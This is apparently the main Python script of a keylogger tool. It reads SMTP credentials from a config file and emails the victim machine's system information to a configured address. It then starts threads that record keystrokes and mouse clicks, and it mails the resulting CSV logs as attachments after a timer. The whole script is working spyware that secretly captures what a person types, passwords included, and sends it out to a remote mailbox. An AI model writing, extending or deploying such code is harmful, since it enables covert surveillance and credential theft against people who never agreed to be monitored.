import os
import json
import threading
import Modules.Mailer as Mailer
import Modules.KeyStroke as KeyStroke
import Modules.SystemInfo as SystemInfo
import Modules.MouseRecorder as MouseRecorder

if __name__ == '__main__':
    # Open JSON file and load data
    with open("config.json", 'r') as f:
        data = json.load(f)
    
    # Extracting data from JSON file
    # Mail Information
    EMAIL = data['mail']['email']
    PASSWORD = data['mail']['password']
    HOST = data['mail']['host']
    PORT = data['mail']['port']

    # Keylogger Information
    SAVE = data['keylogger']['save']
    INTERVAL = data['keylogger']['interval']

    # MouseLogger Information
    SAVE_MOUSE = data['mouselogger']['save']
    INTERVAL_MOUSE = data['mouselogger']['interval'] 

    mailer = Mailer.Mailer(email=EMAIL, password=PASSWORD, host=HOST, port=PORT)

    #  Extracts and Mails system information
    system_info = SystemInfo.SystemInfo.get_info()  # Gets System Information
    mailer.plain_mail(EMAIL, "System Information", system_info)  # Sends System Information

    try:
        threading.Thread(target=KeyStroke.KeyLogger, args=[SAVE, INTERVAL]).start()    # Starts KeyLogger
        threading.Thread(target=MouseRecorder.MouseLogger, args=[SAVE_MOUSE, INTERVAL_MOUSE]).start()  # Starts MouseLogger

        # Sends Keystrokes and Mouse Clicks every 65 seconds
        # 65 seconds is specified so that keylogger and mouselogger gets enough time to record keystrokes and mouse clicks
        threading.Timer(65, mailer.attachment_mail, args=[EMAIL, "Keystrokes", ["filtered_keystrokes.csv", "complete_keystrokes.csv", "mouse-click.csv"], "Keystrokes"]).start()
    except KeyboardInterrupt as e:
        pass